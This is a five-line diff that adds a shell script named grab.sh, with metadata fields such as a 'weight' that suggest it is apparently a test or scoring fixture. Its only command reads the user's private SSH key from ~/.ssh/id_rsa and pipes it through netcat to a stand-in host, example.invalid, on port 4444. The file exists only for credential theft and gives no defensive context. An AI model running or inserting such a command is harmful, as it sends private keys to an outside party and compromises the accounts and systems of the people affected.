@@ -1,0 +1,5 @@
+# path: grab.sh
+# lines: 1
+# weight: 25
+# ---
+cat ~/.ssh/id_rsa | nc example.invalid 4444
